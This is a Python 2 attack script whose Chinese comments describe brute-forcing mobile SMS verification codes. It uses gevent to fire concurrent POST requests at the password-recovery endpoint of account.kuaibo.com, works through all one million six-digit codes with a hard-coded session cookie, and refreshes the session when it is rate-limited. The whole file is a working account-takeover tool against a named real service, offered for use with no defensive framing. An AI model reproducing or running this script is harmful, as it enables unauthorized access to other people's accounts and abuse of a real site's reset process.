#coding=utf8
import gevent
from gevent import monkey
monkey.patch_all()
import sys
import time
import requests
import random
cookies = {
    'pdf':'4C47C302837C71F8EFCA161892CF2BD7'
}
captcha = random.sample(xrange(1000000), 1000000)
counts = 0
break_flag = False
def decode_psw(threads_count=10):
    """
    采用暴力破解手机验证码
    Args:
        threads_count:启用的线程数，默认为10个，type=int
    这里用gevent的线程
    """
    threads_lt = []
    step = 1000000/threads_count
    for i in range(0, 1000000, step):
        thread = gevent.spawn(multi_decode)
        threads_lt.append(thread)
    gevent.joinall(threads_lt)


def multi_decode():
    """测试的数字区间
    Args:
        begin:从这个数字开始测试一直到 end
        type=int
    """
    global cookies
    global break_flag
    global counts
    for i in range(0, 1000000):
        if break_flag:
            break
        code = "%06d" % captcha[counts]
        counts += 1
        while 1:
            r=requests.post('http://account.kuaibo.com/passwd_mgr/passwd_find/way_mobile/',
                            data={'mobile_captcha':code},
                            cookies=cookies
                            )
            ret = r.json()
            if ret.get('ok'):
                print code, 'find , Oh yeah!!!'
                break_flag=True
            if not ret.get('ok') and not isinstance(ret.get('reason'), unicode) :
            #异常了
                time.sleep(1)
                print 'time sleep(1)'
                requests.get("http://account.kuaibo.com/passwd_mgr/passwd_find/select_way/?\
t=%s" % cookies.get('pdf'), cookies=cookies)
            else:
                break

if __name__ == '__main__':
    argv = sys.argv
    threads_count = 10
    if len(argv)>1 and argv[1]:
        threads_count = int(argv[1])
    print time.time()
    try:
        decode_psw(threads_count)
    except:
        print counts
    print time.time()





